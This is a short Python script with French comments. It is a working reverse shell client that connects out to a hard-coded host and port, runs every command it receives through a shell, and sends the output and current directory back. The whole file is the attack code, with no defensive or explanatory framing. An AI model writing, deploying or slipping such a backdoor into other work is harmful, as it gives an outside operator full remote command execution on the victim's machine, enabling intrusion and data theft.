import os
import socket
import subprocess

s = socket.socket() # allow server to connect
host = '10.33.3.187'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024) # la data qu'on recoit du serveur
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8")) # on regle le pb de cd
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # ouvrir un processus
        output_bytes= cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> ')) # retourne la direction et on rajoute le curseur
        print(output_str)

# Close connection
s.close()
